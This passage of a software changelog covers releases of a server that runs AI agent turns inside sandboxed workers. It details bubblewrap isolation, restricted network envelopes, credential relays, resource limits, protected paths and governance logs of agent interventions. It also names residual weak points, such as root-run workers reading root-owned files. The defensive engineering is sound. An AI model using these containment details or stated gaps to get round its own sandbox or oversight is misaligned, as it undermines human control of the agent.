  `worker_state_busy` with Retry.

- 857ab01: Enforce per-turn tool-call, wall-time, observed changed-path and write caps through the existing worker lifecycle and shared journal observations. Interactive turns freeze for a finite, once-per-dimension Continue or Stop decision; the free-space floor and true voice remain Stop-only. Retain scoped decisions, interruption/recovery receipts and truthful observation coverage in the existing turn disclosure and expose actual limits in This chat. Independent host deadlines and resource/storage limits remain binding.
- 810ae6f: The server now keeps a machine-readable record of sandbox and governance interventions with each session's history (#1651). A new `governance_events` table holds one versioned, schema-validated record per event: promotions, policy blocks and confirmations, read-only refusals, quarantines, budget and scope limits, egress denials, `strict` fallbacks, revert conflicts, outward actions, taint, unavailable providers, worker resource limits and roadblocks. Records survive the 7-day Activity span-detail prune and are deleted with their session. The new authenticated `GET /api/governance/events` reads them, filtered by session, turn and kind. Nothing is shown to the user, and nothing is written to `brain.db` or the brain. This release adds the record and its reader; the features that write each kind land separately.
- 5876df6: Restore direct writes for ordinary hosted turns with the governed profile while keeping policy and runtime configuration protected. Strict remains opt-in and autonomous workers retain their restricted permissions. Snapshot consumers run configuration from immutable startup views, with validated maintenance output publication and separate persistent write areas. Report the profile, protected paths and shared-uid limits in host status and the agent context; reconcile and incrementally index governed turns on completion.

  Bound immutable inputs and publication copies in a separate admitted 256 MiB output-staging tmpfs by default, with validated host overrides, Retry on busy admission and ENOSPC on overflow. Capture file-browser ignore bytes without copying unrelated repository data.

  Require the operational database and private server state outside the brain for every hosted profile. Refuse invalid layouts at boot with named migration guidance and matching status diagnostics, preserving the worker masks. Hosts must install util-linux nsenter and allow setns in the namespace seccomp profile for bounded staging.

  Revalidate complete startup inputs, retain native-write path locks through staged publication, preserve peer-created output names, and handle publication refusals without unhandled worker lifecycle rejections.

  Refuse database, WAL/SHM and private-state aliases exposed inside the brain by hardlinks or bind mounts, including new database paths beneath mounted state parents. Preserve valid outside-only aliases and mask resolved database, token and quarantine targets.

  Release staging and writer-gate admission even when private output modes prevent publication. Finalize directory permissions after children, rechecking held/visible identity and temporary mode while retaining peer updates and processing remaining directories after an error. Keep host Git transport free of brain mounts; local sync uses frozen inputs and validated output publication.

  Preserve private turn-temp capacity for in-memory hosts, reject private-state descendant inode aliases, and retain publication parent handles so peer permission changes do not strand unaffected child modes.

- bdb1d6d: The server no longer runs the brain's own code, the `brain` CLI or git against the brain in a host process wherever a governed turn could have changed it (#1648). Capture planning and the index refresh behind `brain_add`, every server-spawned `brain` command, the streamed sync, cron jobs and git's ignore checks run in a maintenance worker instead: the same bubblewrap launcher, with the brain writable, the host read-only, and `/run`, `/var/lib`, the home directories and the UI database's directory masked. A malicious `brain.config.ts` import, `bunfig.toml` preload, `.env`, git include or symlinked ref therefore runs only inside that sandbox. Work a turn waits for runs without credentials or network and holds the brain's new writer gate shared; credentialed work (sync, reindex, capture, module actions) holds it exclusively and waits for running writers. Boot, and the cron runner before each job, quarantine any protected file a governed turn left behind after an unclean stop, beside the UI database.

  `GET /api/status` gains `runtime.workerHost.governed`: whether the `governed` profile can run, why not (`server_cwd_in_brain`, `database_in_brain`, `worker_host_unavailable`), and whether the brain's code runs in workers or on the host. A server started from inside the brain reports `governed` unavailable. The generated crontab now starts every line with `cd /` and the cron runner gives each job the brain as its working directory; regenerate the crontab on upgrade. The brain's CLI must be installed inside the brain (`node_modules/.bin/brain`), not linked from a home directory. The Claude runtime version probe now runs outside the brain.

- dd3bf90: Route hosted Git sync through a private host mirror. Brain configuration, Git includes, commits and merges run without Git credentials; a separate transport mounts only host-selected storage, checks objects before pushing, and never reads the brain.
- 6f74aaa: An answer whose turn-temp link was promoted into scratch now shows the link to the copy in the open conversation as soon as the turn has ended, with no reload and no marker (#1698). The server sends the turn's clients a new `message_links` frame (`{ sessionId, turnId, links: [{ from, to }] }`) for each promoted file, and the client rewrites those link destinations in that turn's answer, outside code, exactly as the saved answer was rewritten. A turn with no promotion sends nothing. For backend authors, the `promotion` activity event gains optional `aliases` listing other spellings of a link to the same file.
- 966bed8: Bound maintenance temporary storage separately from agent turn temp and output staging. Add validated command and aggregate limits, cross-process admission and maintenance-only nested-usernamespace enforcement while preserving the separate Git transport boundary.
- 2151826: Show a dismissible saved-state warning at the existing 75% threshold using the
  backend's actual admission measurement. Preserve its age, dismissal across
  reloads, changed-allowance invalidation, quiet history, voice and focus behavior,
  and the existing reviewed continuation. Add optional result/history observations
  and provider allowance metadata without changing capacity or admission.
- 857ab01: Enforce admitted turn, conversation and UTC-day list-price inference budgets using completed response receipts, retained Activity usage and unknown-price token fallback. Share measured limits and once-only warnings with the existing turn disclosure; preserve partial work and reviewed conversation handoff on a named budget stop.
- f5433b3: Require existing per-use approval for visible outward commands in interactive turns, preserve force-push and voice refusals, and retain irreversible admission receipts in the turn journal. Explicitly disclose opaque HTTPS-script and unavailable outward MCP descriptor coverage.
- 185803c: Read a strict, versioned governance policy as host data, with a read-only
  `brain policy check --json` command, content-index exclusion, last-valid
  fallback, immutable per-turn identity and interactive/voice profile and
  protected-path selection. Autonomous authority and sibling enforcement remain
  unchanged. Approved budget and scope defaults resolve without enforcing them.
  Authoritative agent Markdown and submitted PNG applications share admitted
  protection, including planned destinations and protected scratch retention.

  The CLI and server share the data-only policy reader through the internal common
  package, preserving server imports and declarations without the optional core peer.

- f5433b3: Add validated hosted policy proposals with explicit exact-base approval, retained same-request receipts and read-only policy settings. Voice and autonomous tools and worker policy-write restrictions remain unchanged.
- c41f173: Each Claude worker now gets its own private, size-limited tmpfs for its runtime state (#1625), so parallel sessions no longer share, and run out of, the host's `/dev/shm`. The allowance is 64 MiB per worker by default (`BRAIN_UI_WORKER_STATE_BYTES`). Before a worker launches, its whole allowance is reserved against a server budget, which defaults to the allowance times `MAX_CONCURRENT_SESSIONS` and can be set with `BRAIN_UI_WORKER_STATE_BUDGET_BYTES`. Invalid values stop the boot with the variable's name. The server copies the conversation in before the runtime starts and copies validated transcripts and memory out after the worker's namespace is gone. Nothing is left behind if the server dies.

  Two new first-party failure classes, both registered in `FIRST_PARTY_FAILURE_CLASSES`, get their own cards. `worker_state_busy`: the budget is held by running conversations; the turn is refused before launch, nothing is sent, and Retry runs it. `worker_state_exceeded`: the turn filled its allowance; it ends as this failure even if the runtime finished its answer, because the rest was not saved. A conversation whose saved state does not fit the allowance stays `session_too_large`; the old 128 MiB bound is gone. Claude workers need bubblewrap 0.7 or later.

  Agent memory written during a turn is now kept (#1626): new or changed `memory/*.md` notes are persisted with the same alias, size and concurrent-change checks as transcripts. A note another conversation changed meanwhile is refused alone and named, and nothing is deleted.

- f5433b3: Add authenticated user history revert and quarantine restoration with raw-byte
  stale-state checks, journaled Undo, and original-operation receipts. Running
  turns finish before revert while new turns queue behind it. Existing retained
  change readers expose single-file actions and one whole-turn review dialog;
  partial, conflicting and unknown outcomes remain beneath the original turn.
- 857ab01: Classify retained steering inputs separately from content and approved policy changes. Show their count and first history group through existing diff/revert controls, preserving recorded taint source IDs and shared observation limits.
- 52cbd1d: Add host-owned raw journal snapshots and private content objects with bounded
  storage accounting, independent of the brain's Git objects and executable
  configuration.
- 703a922: Preserve scratch files linked from retained conversations across age and size pruning, backfill session pins, and report pinned overage or unavailable pin data. The server requires CLI 0.42.0 for the additive scratch pin input.
- 3070884: Add an authenticated host-local roadblock report and the `query_activity` roadblocks scope. Rank retained episodes by frequency and measured token, cost and time waste, preserving unknown coverage, remedy counts and example turns.
- 67a48ca: A server running as root now says so (#1638). Its agent workers run as root too, and although they have no capabilities and a read-only `/proc`, they can still read root-owned files and connect to root-owned and abstract Unix sockets. The server still boots. It logs that warning once at boot, reports it on `GET /api/status` as `runtime.workerHost.rootServer` (typed on `WorkerHostStatus` in `@schlessera/brain-ui-sdk/protocol`), and the app shows a standing notice above the composer that links the hosting guide's section on running the server as a non-root user.
- 3212c7d: Allow reviewed handoffs to any available profile, including the source conversation's own backend. Every handoff starts a distinct linked conversation. Preselect the source profile when recovering from `session_too_large`, closing the single-backend dead end while preserving review, reference checks, recording and idempotency. This is an additive contract behavior change: the same-backend refusal is removed.
- 52cbd1d: Add authenticated per-chat governed or strict preferences in the model picker's This chat section. Successful saves affect the next interactive turn, preserve the policy lower bound, and bind first-turn choices through the existing draft identity. Show voice facts read-only and unavailable limits as unknown.
- f5433b3: Render the governed worker note from actual admitted journal and user history
  availability, preserving the resolved protected paths and their reasons.
  Standalone or incomplete hosts cannot promise restoration, and genuine voice
  turns retain journal guidance without granting agent revert or Undo authority.
- 857ab01: Retain explicit shared-window conflict versions and let authenticated users keep a selected observed version or both through the existing history operation, with raw-state checks, numbered exclusive siblings and journaled Undo.
- 5c4ee70: The server now records every roadblock an agent hits in a turn (#1671). This covers tool errors, nonzero shell exits, `EROFS` and `EACCES` refusals, permission and policy denials, budget and scope limits, network refusals and repeated attempts. At turn end, the server groups each turn's failed steps into episodes, for Claude and pi alike. Each episode records the call that finally worked, the time, tokens and cost the detour wasted, and whether better guidance or a new capability would remove it. Episodes are stored as `roadblock` governance events in the session's kept history and read through `GET /api/governance/events`. Nothing is shown to the user. Token and cost waste stay unknown, never zero, for interactive turns until those turns report usage as they run. The pi `bash` tool now ends a long, clipped failing output with its `[exit N]` line too.
- 6377291: A file the agent links in turn temp (`$BRAIN_WORKER_SCRATCH`, `/tmp` or a write under `$HOME`) no longer becomes a dead link when the turn ends (#1655). Once the worker has exited, the backend copies each linked file into `.brain/scratch/turns/<turnId>/` and the saved answer links the copy, with nothing shown in the chat. The copy follows no symlink, refuses hard-linked files and directories, and is bounded at 128 MiB per file, 256 MiB and 64 files per turn; a refused file keeps its original link. Every copy and refusal is stored as a `promotion` or `promotion_refused` governance event (`GET /api/governance/events`). Turn temp is the worker's private, size-limited `/tmp` tmpfs. The server retains a directory descriptor into that filesystem so linked files can be promoted after the worker exits; this does not use a host-created `/dev/shm` staging directory. For backend authors, `StartTurnRequest.turnId` passes the host's turn id, and `BackendActivityEvent` gains the `promotion` and `promotion_refused` variants.
- 1c20df8: The server now learns at boot whether its host can run agent workers, instead of finding out on every turn (#1632). Boot probes the agent worker boundary (the restricted envelope too while autonomous work is enabled), logs a failure once with its named requirement, and keeps running. `GET /api/status` reports the latest probe as `runtime.workerHost` (typed as `WorkerHostStatus` in `@schlessera/brain-ui-sdk/protocol`), every turn's own probe re-records it, and the new authenticated `POST /api/status/worker-host` re-runs the probe. While the host is unavailable, the app shows a notice above the composer that names the requirement, links the hosting guide's container section and offers "Check again". The composer stays usable. A turn sent anyway is still refused by its own probe, and its failure card now says the server can't run agent turns and shows the requirement, without offering a retry. Every turn still runs the probe: a passing result is never cached.
- 2b196b3: Every agent worker now runs under resource limits, so one runaway turn cannot exhaust the host (#1660). `prlimit` sets the process, per-process memory (`RLIMIT_DATA`), file size and open file limits inside the worker before the agent starts. Where the server runs alone in a delegated cgroup v2 subtree, such as a systemd unit with `Delegate=yes`, each worker also gets its own cgroup with `memory.max`, `pids.max` and `cpu.max`. The defaults are far above normal use: 4096 tasks, half the memory the server has (physical memory, or a lower cgroup cap above it), 16 GiB per file, 65536 open files and all CPUs but one. `BRAIN_UI_WORKER_LIMITS` overrides them, for example `memory=8GiB,pids=2048,cpu=2`. A host without `prlimit` (util-linux) now refuses agent turns and names that requirement. `GET /api/status` reports each limit as enforced or absent, with the reason, under `runtime.workerHost.limits` (`WorkerLimitsStatus` in `@schlessera/brain-ui-sdk/protocol`). The agent is told the same limits before it starts. A cgroup limit hit is recorded in the run's Activity next to the step that caused it. A limit that ends the worker fails the turn with the new first-party class `worker_resource_limit`, which names the limit. Backends report hits through the new `resource_limit` activity event.

### Patch Changes

- 3b408f8: Require brain CLI 0.42.0 or newer before startup. Hygiene review introduced the 0.41.0 prerequisite; this release's additive scratch pin input raises the effective floor to 0.42.0 so every server-invoked command and flag is available. Update the content repository's `@schlessera/brain` pin and lockfile with the server before deploying.
- ea12d65: Keep classified answer blocks after reloading a conversation whose temporary
  artifact links were promoted to persistent scratch. Saved blocks follow the
  rewritten text and retain correct spans regardless of classification timing.
- 0d97149: Complete the bundled offline Claude pricing snapshot with the active model IDs verified for this release, while retaining historical prices and explicit estimate provenance.
- f5433b3: Allow the server to start before its brain root is provisioned. Policy proposals still require an existing root and explicit approval before the checked writer publishes bytes.
- acec591: Preserve all first-party failure classes in reviewed failed-turn reports through the shared FIRST_PARTY_FAILURE_CLASSES SDK registry. Unregistered third-party classes still report as unknown. The additive SDK export ships in a minor release (#1619).
- b8862b3: Give hosted agent turns verified persistent scratch and workspace areas (#1626), now integrated with the 0.42.0 profiles. Governed is the interactive/voice default: ordinary brain files are writable except protected paths, and scratch/workspaces use their canonical destinations. Strict keeps an immutable read-only execution view and writes private copies at `/tmp/brain-worker-areas/scratch` and `/tmp/brain-worker-areas/workspaces`, with validated publication after exit; links use the canonical brain destinations. Scratch is created when missing and refused when redirected by a symlink or not gitignored; an existing workspace remains unavailable when its boundary cannot be verified.

  There is no agent HOME overlay. Host home is read-only and may be masked by the resolved profile; fresh XDG directories live in size-limited turn temp. The generated note states the actual profile, writable paths and output-link rules. CLI read-only refusals name the scratch route, and scratch serving/pruning uses descriptor-safe operations on Linux. Autonomous turns retain their restricted envelope.

- 4914236: A write into the scratch area no longer deletes its own output when files linked from retained conversations already exceed the 1 GB cap. `brain render`, `brain geo map`, `brain okf export`, `brain image` and the chat UI's scratch mask now protect the files they just wrote during the prune that follows, so a successful report always names files that exist. Later prunes treat that output like any other unlinked file; the seven-day and 1 GB defaults are unchanged and pinned overage is still reported.
- Updated dependencies [f58ef21]
- Updated dependencies [52cbd1d]
- Updated dependencies [8b4fbdc]
- Updated dependencies [857ab01]
- Updated dependencies [5876df6]
- Updated dependencies [a8fbaa3]
- Updated dependencies [bdb1d6d]
- Updated dependencies [dd3bf90]
- Updated dependencies [6f74aaa]
- Updated dependencies [966bed8]
- Updated dependencies [a948934]
- Updated dependencies [2151826]
- Updated dependencies [857ab01]
- Updated dependencies [857ab01]
- Updated dependencies [f5433b3]
- Updated dependencies [185803c]
- Updated dependencies [f5433b3]
- Updated dependencies [c41f173]
- Updated dependencies [ea12d65]
- Updated dependencies [f5433b3]
- Updated dependencies [857ab01]
- Updated dependencies [08b45c4]
- Updated dependencies [52cbd1d]
- Updated dependencies [02d4eb0]
- Updated dependencies [3070884]
- Updated dependencies [67a48ca]
- Updated dependencies [1283ca4]
- Updated dependencies [52cbd1d]
- Updated dependencies [3212c7d]
- Updated dependencies [f5433b3]
- Updated dependencies [857ab01]
- Updated dependencies [acec591]
- Updated dependencies [6377291]
- Updated dependencies [aa4e0f0]
- Updated dependencies [1c20df8]
- Updated dependencies [acec591]
- Updated dependencies [2b196b3]
- Updated dependencies [8da5c42]
- Updated dependencies [b8862b3]
  - @schlessera/brain-ui-sdk@0.42.0
  - @schlessera/brain-common@0.42.0
  - @schlessera/brain-render-template@0.42.0
  - @schlessera/brain-geo@0.42.0

## 0.41.0

### Minor Changes

- 45326b1: Show follow-ups that are still waiting for the agent, and keep them through a reload. A message sent while a session is busy no longer appears in the chat until the agent takes it: it waits as a `pending` pill in the right half of the row above the composer, and its full text opens on hover, keyboard focus or a tap. Three or more show the oldest pill and a `+N pending` summary that opens a read-only `Pending follow-ups` sheet. When the agent takes one, its pill goes and the message appears in the chat once, where it entered the conversation; a dropped one leaves with its reason. The host reports each session's queue in a new `session_queue` frame (`server_hello.capabilities.followUpQueue`, sent only to clients that declare the same flag in `client_hello`) after a reconnect, after `session_resume` and on every change, so a reloaded or second client rebuilds the same stack. The kit adds `PendingFollowUps` and `followUpLabel`, and `ListRow` gains `describedBy` for pills.
- 637d2c4: Label pending follow-up and working-session pills with a few words from a small, fast model. A host that passes `createApp({ labeller: { provider } })`, with any value of core's `CompletionProvider` shape, gets a 2–4 word label for each queued follow-up (on `QueuedFollowUpView.label`, sent again in `session_queue` when it arrives) and for each session's latest request (on `ChatSession.label` in `GET /api/sessions`, stored so a reload or restart reuses it). Labels are plain text of at most `PILL_LABEL_MAX_CHARS` (32) characters. Pills render at once with their fallback, the session title or the start of the prompt, and keep it when the labeller is off, which is the default, or fails. With a labeller set, the text of every queued follow-up and turn request goes to its provider, which may be a different vendor from the session's backend. Calls are counted in `brain.labeller.calls`. The app's pending follow-up pills print the host's label when there is one.
- f508e27: Keep the composer's drafts on this device across a reload. The authenticated `GET /api/vpn-check` probe now also returns `accountKey`, an opaque name for the signed-in account on this host and brain root that stays the same across sign-out and sign-in as the same owner, differs between hosts and roots, and is never given to an agent principal. The client writes every draft (text and images), the voice review text, the selection, the focused element and the transcript position to IndexedDB in that account's partition a moment after each change, and opens the partition only while it holds the same key. After an authenticated boot as the same account they come back: the text, images and review text, the selection and focus, then the place in the transcript. Another account restores nothing. A write the browser refuses shows `Couldn't save your draft on this device.` in the composer's hint and is never reported as kept, while editing goes on. Staged track files still live in this tab only. The stored drafts are not encrypted and are not protection against someone with access to the device.
- 9a89d4a: Show configured profiles that cannot run now, with their reason, in the handoff sheet. `AgentBackend` gains an optional `listUnavailableProfiles()` returning `{ id, label, reason }`, with `reason` from the closed `PROFILE_UNAVAILABLE_REASONS` enum (`needs-credentials`). The Claude backend reports a profile whose required environment key is missing; pi lists every configured profile and omits the member. `GET /api/providers` gains an optional `unavailable` list beside `providers`, absent when empty: the runnable roster, routing and handoff resolution are unchanged, and the host drops any entry whose reason is not in the enum, so no key name or other backend text reaches a client. The handoff sheet's To list shows these profiles on other backends after the runnable ones, disabled and reading `needs credentials`; they cannot be chosen.
- b0815ec: **Breaking (pre-1.0, ruled on #1053):** narrow the public surfaces that were public only because a public declaration reached them, and move the names whose classification was uncertain.

  - `@schlessera/brain-ui-server`: `WsHost` keeps its configuration fields, `registry` and `close()`. Its connection, client-set, catalog, turn, activity, inbox, draft, label and classification members are `@internal`, as are the matching `WsHostOptions` fields. `SessionCatalog` and `createSessionCatalog` move to `@schlessera/brain-ui-server/internal`; a custom session catalog is no longer supported, so build the host with `createApp`.
  - `@schlessera/brain-ui-react`: `useChatStore`, `useFileStore`, `useShareStore`, `useUIStore` and `useVoiceStore` are typed as `ShellStoreHook<View>` over the new `ChatShellState`, `FileShellState`, `ShareShellState`, `UIShellState` and `VoiceShellState`, which hold the fields a shell reads and calls. The selector form and the `getState()`/`subscribe()` statics remain; `setState` is no longer typed. `activeChat`, `anyStreaming` and `hasPendingShare` take the views. `ShareIntakeState` is no longer exported, the full store state types leave the public surface, and `BrainUiRoot.stores` is `@internal`.
  - Moved to `/internal`, with no compatibility promise: `collectStats` and `CollectStatsOptions` (`@schlessera/brain/internal`); `MAX_ROUTE_BYTES` (the new `@schlessera/brain-geo/internal`); `applyExportLinkPolicy` and `protectExportLinkDestinations` (`@schlessera/brain-render-template/internal`); `TOKENS`, `LIGHT_TOKENS`, `canvas` and `TokenName` (`@schlessera/brain-ui-kit/internal`); the SDK's bridge-tool handlers (`handleAskUser`, `handleAskUserForm`, `handleAskUserList`, `handleAskUserRank`, `handleGetCurrentLocation`, `handleQueryActivity`, `handleRequestImageMask`, `handleShowBlock`, with `ImageMaskHandlerOptions` and `LocationHandlerOptions`), `wrapCommand` and `execWrapperSpawnOptions` (`@schlessera/brain-ui-sdk/internal`); `describeRetry`, `canonicalModelId` and `resolveThinkingLevel`, from every SDK entry (`/internal` and `/internal/client`); `createToolRendererRegistry`, `pruneStoredShares`, `ShareTargetError`, `isShareTargetRequest` and `handleShareTargetRequest` (`@schlessera/brain-ui-sdk/internal/client`). `registerShareTarget` and `readShareLaunchParams` stay on `/share-target`.
  - Kept and documented: `repoRelativePathSchema` (module config schemas), `MEASURED_RUNTIME` and `runScrape`.

  The migration list is in `docs/decisions/public-export-boundary.md`.

- 755e567: Record what the pill labeller spends. Every label call that reaches the host's label model is now an Activity run named `pill label` (`LABEL_RUN_NAME`) on the session whose pill it labels. A provider can report the call's usage and model through a new optional `LabelCompletionProvider.completeWithUsage`, which the labeller prefers to `complete()`, and the host declares how those calls are billed with `createApp({ labeller: { provider, billing: "api" | "subscription" } })`. A run is priced only when the call reported usage and a model and `billing` is set. Every other run counts as unpriced and is never shown as $0; that includes every call from a core `CompletionProvider`, which still satisfies the interface unchanged.
- daf4546: Run the scripts of HTML files in the file viewer, isolated from the app. A new authenticated `GET /api/files/html?path=…` serves an `.html`/`.htm` file under the same path, auth and size rules as `?raw=1`. Its CSP `sandbox allow-scripts` directive gives the document an opaque origin, and `connect-src 'none'` and `form-action 'none'` keep it off the network. It is the only response sent with `X-Frame-Options: SAMEORIGIN`; every other response keeps `DENY`. The viewer's preview now loads that route in an `allow-scripts` iframe, and an "Open in new tab" link opens it full-screen with the same isolation. A previewed page cannot read the app's DOM, cookies or storage, call `/api/*`, open popups, submit forms, download files or navigate the app. It can still navigate itself to another site, carrying what it can read, and a tab shows it under the app's host: both are accepted residual risks (#1084). The SDK's default service-worker policy never answers an `/api` navigation from the app shell.
- 21f146d: Spawn every brain CLI and repository script through the exec wrapper of the app's own configuration. An app created with an explicit `config` used to launch the brain CLI, `whatsup` and the streaming sync under whatever `BRAIN_UI_EXEC_WRAPPER` the process environment named, so two apps in one process shared one privilege boundary. `ServerConfig` gains optional `exec`, which `resolveServerConfig()` always sets, and `createBrainClient` accepts `exec`. A configuration or client without it keeps the process environment's wrapper, resolved once, and never spawns unwrapped. A relative `BRAIN_UI_EXEC_WRAPPER` now refuses at configuration time instead of failing each spawn, and the cron bin resolves the wrapper once at its entry point.
- 825cd04: Breaking (pre-1.0, ruled on #343 question 1): package entry points now export only the supported API. Names that only brain-kit's own packages used moved to `/internal` entry points, which have no compatibility guarantee and need the same lockstep version: `@schlessera/brain/internal` (path-safety, scratch, generated-region, taxonomy, context and write helpers, in addition to the existing native-handle helpers), and the new `@schlessera/brain-scrape/internal`, `@schlessera/brain-render-template/internal`, `@schlessera/brain-ui-kit/internal`, `@schlessera/brain-ui-server/internal` and `@schlessera/brain-ui-sdk/internal/client`; `@schlessera/brain-ui-sdk/internal` and `@schlessera/brain-backend-pi/internal` gain entries. Other incidental exports were removed: core's database, indexing, ingestion, search, archive, audit, validation, skills-discovery and config-loading functions (use `@schlessera/brain/queries` for content-index reads), the modules' ledger, scoring, routing and database helpers, pi's runtime building blocks, Claude's model-discovery helpers, ui-sdk's per-kind block schemas, tone tables, classification and web-search internals, ui-server's route, cron, staging and keyterm helpers, ui-react's URL helpers and default-root singletons, and the link-policy duplicates on the ui-kit root (use `@schlessera/brain-ui-kit/links`). Every removed or moved name, with its migration path, is listed in `docs/decisions/public-export-boundary.md`. The supported surface includes every type reachable through a public signature; from 1.0, breaking it needs a major version.
- 5416a22: Notify recipients about waiting Actions. Push-eligible decisions (score 12 or
  more) collect in a fixed 60-second window per recipient and leave as one
  counted notice that opens Actions. Each device is evaluated on its own:
  strict local quiet hours from 22:00 to 08:00, at most one known successful
  push per waiting episode, and bounded retries that resend only what is still
  waiting and unsent. Lower-priority decisions and FYIs join the in-app digest
  at the client's local 09:00 and 17:00, listing only work not already reported
  to that client. Clients report their IANA zone on registration, rebind,
  reconnection, foreground return and zone change; without a usable zone,
  timed notices stay pending instead of using server time. Additive: optional
  `timeZone` on `POST /api/push/subscribe`, `timeZone` in subscription
  summaries, the SDK worker renewal sends its zone, and the
  `ActionDigestEntry`/`ActionDigestSummary`/`ActionDigestState` protocol types.
- 98baa4c: Interactive answers are delivered with receipts (breaking for ask answers,
  #910). A host now settles an `ask_user`, `ask_user_list`, `ask_user_rank` or
  `ask_user_form` answer only when it carries a `submissionId`, and tells the
  sender what happened with an `ask_answer_receipt`. **Compatibility break:**
  an older client's answer, which carries no `submissionId`, is refused with an
  `ASK_ANSWER_UPDATE_REQUIRED` error and the question stays waiting. An updated
  client shows "Update needed" instead of answering a host that does not
  advertise `askReceipts`. Update the client and the host together. Tool
  approvals, dismissals, location and mask replies are unchanged.

  The wire protocol is revision 5. It adds `ask_answer_status`, `ping`/`pong`
  liveness probes, `server_hello.principalKey`, and the `askReceipts` and
  `liveness` capabilities. After `session_resume` the host re-sends that
  session's pending questions. On the Claude backend an ask's request id is
  now the model's `tool_use` id, so a card rebuilt from history answers the
  same request as the live one.

  `BrainUiClient` probes a foreground socket after 15 seconds without traffic
  and replaces it if no `pong` arrives within 5 seconds. It also abandons a
  connection attempt that has delivered nothing after 10 seconds, and exposes
  `checkLiveness()`, `setForeground()`, `supportsAskReceipts` and `hello`.

  In the chat UI, a request delivered twice, or after history, is one card.
  A submitted answer is saved on the device (IndexedDB), then sent. It shows
  as answered only on the host's receipt, and it is retried automatically after
  a reconnect or a reload. The queue holds up to 16 answers and 16 MiB for up
  to 24 hours. It is coordinated across tabs, and it is cleared at sign-out.
  Each card shows where its answer stands, with Cancel sending, Copy answer,
  Send as message, Edit and Try again where they apply. After Submit, focus
  moves to that status rather than to the composer.

- 75e79b6: Let a client that reloads, reconnects or comes back to a session learn from
  the host what that session's latest work actually is. A host now advertises
  `server_hello.capabilities.sessionRecovery` and answers
  `GET /api/sessions/:id/recovery` with the latest accepted request (its
  `requestId`, the `turnId` that runs it, and whether it is queued, running,
  terminal with its Activity outcome, or unknown), a persisted revision that
  orders acceptance, and the approvals and questions still waiting in the
  session. A newer queued request is never reported as an older success, a
  restart never resurrects a lost queue or turn, and whatever the host cannot
  prove reads `unknown`. Replayed history may carry a host-proven `turnId` on
  the answer that ended each turn. A `session_resume` now re-sends the
  session's pending approvals, and the transcript draws a turn shell holding
  the card, marked `restored`, when the replay ends on the user's message, so a
  reload no longer loses a pending approval. Additive: the `SessionRecovery*`
  types, `sessionRecoverySchema`, `classifySessionRecoveryResponse`, the
  optional `SessionHistoryMessage.turnId`, and the React API client's
  `sessionRecovery()`.
- 18d5dde: Keep each session's unsent composer draft on the host, so its text and images
  survive a reload, a closed tab or a host restart and come back on the same
  operator's other devices. The host stores drafts in its own operational
  database (never `brain.db`) behind six authenticated routes under
  `/api/drafts`: list, read, save with `If-Match` and `Idempotency-Key`, upload
  an image, delete (leaving a tombstone) and bind an unbound draft to the
  session its accepted first message started. Concurrent saves of one revision
  get one success and a `DRAFT_CONFLICT` carrying the host's version; nothing
  is merged, evicted or expired. Limits are 64 KB of text, 8 MB per draft, 100
  drafts and 256 MB per host. Additive: `server_hello.capabilities.sessionDrafts`
  with `server_hello.sessionDraftLimits`, the optional `chat_message.draftRef`
  (an accepted message consumes exactly that revision), the `Draft*` protocol
  types and response schemas, and `If-Match`/`Idempotency-Key` in the
  configured CORS allow-list.
- 6f06be8: Expose shared durable inbox tool contracts and eagerly attached first-party bridge executors. Reuse authorized store reads and compensated trusted intake, enforce current turn and budget-admitted origin scope, and require an exact approved session/Action binding for deterministic resolution. Voice and restricted turns refuse mutations; deferred discuss sessions remain disabled.
- 84b8e00: Run autonomous Claude and pi turns inside a restricted envelope. The worker gets a private network namespace with only loopback and an explicit read envelope instead of the host root, so it cannot read the host home, stored logins or the server's environment, and cannot reach the network, DNS or host Unix sockets. Inference leaves only through a server-owned relay socket that forwards the provider's inference routes to the profile's upstream and injects the server-held credential; the worker holds a placeholder. Restricted turns load no project settings, instructions, skills, hooks, MCP servers or pi extensions, and use only the server's instruction snapshot and enforced tool roster.

  Additive SDK surface: `AutonomousTurnOptions.containment: "restricted"`, `BackendCapabilities.restrictedAutonomous`, and an optional `supportsRestricted` argument to `assertTurnPosture`. `runAutonomousTurn` always requests containment and refuses a backend without the capability. A restricted turn refuses before any worker starts when the host cannot establish the envelope, when a Claude subscription profile has no `CLAUDE_CODE_OAUTH_TOKEN` (a stored login is never copied into the envelope), or when a pi profile has no API key for an Anthropic Messages or OpenAI-compatible provider. Interactive, voice and handoff-summary turns are unchanged. Nothing dispatches autonomous work in production yet.

- 9d33857: Allow server-marked decisions blocking autonomous work from share or CLI intake
  to produce counted push notices below the ordinary priority cutoff. Preserve
  quiet hours, fixed batching and delivery receipts; ordinary decisions retain
  their existing score policy, and pushed blocking episodes do not join the digest.
- 0fff240: Add bounded T0/T1 triage using pinned Jev Choice, independent answer recovery,
  per-request budget admission and usage accounting, durable review escalation,
  and diversion telemetry. Production dispatch remains gated on the autonomous
  system proof. Missing pricing or usage cannot become a free paid operation.
- 90d83d8: Run every Claude turn inside the isolated worker and apply hosted PNG masks through the bounded server operation.
- d2436b8: Continue a conversation on another backend (#61). The locked model picker, a session row's overflow and the ⌘K palette open a review sheet that drafts a handoff summary with the source's own model (falling back to a draft from the last six messages), lets you edit it and pick references, and starts a new linked chat on the chosen backend. The source keeps its history, backend and accounting and shows a forward marker; the new chat opens with a handoff card linking back. Additive wire: `chat_message.handoff`, `handoff_prepare`/`handoff_prepare_cancel`/`handoff_status`, `handoff_draft`/`handoff_receipt`, message source `handoff` and `ChatSession.handoffFrom`. A repeated handoff key never creates a second session. `ModelPicker` gains an optional `lockedAction`.
- 33af7e2: Support external dictation providers through `createApp({ speechProvider })`,
  with explicit-selection mismatch errors, session validation and no silent
  fallback. Publish `runSpeechProviderContract` and `runAsrClientContract` with
  keyless transport harnesses, and document the matching public client registry
  and authoring types. Dictation interfaces remain experimental until 1.0;
  live conversation and permission authority retain their separate boundaries.
- b04f98b: Pause hygiene review with a durable Actions-limit retirement reason and let explicit Resume admit a fresh card under the shared hard cap. Retain confirmed operation receipts across retirement and recovery.
- 978031a: Add a deterministic human-started hygiene review backed by durable Actions, with pause/resume, confirmed CLI previews, persisted failure outcomes and check-only interrupted-write recovery. Extend the inbox contract with bounded handler input and hygiene effects. Existing generic cards display the new effect as unavailable until the separate hygiene surface is implemented.
- e632b50: Add explicit human-started hygiene finding refresh. Refresh replaces an obsolete
  Action with current CLI evidence and previews, retains a superseded receipt,
  and refuses old confirmations without changing Markdown or review position.
  The CLI supports read-only targeted `hygiene next --finding <id> --dry-run`.
- 533c0a7: Add the live-conversation host contract (#957). `@schlessera/brain-ui-sdk/server`
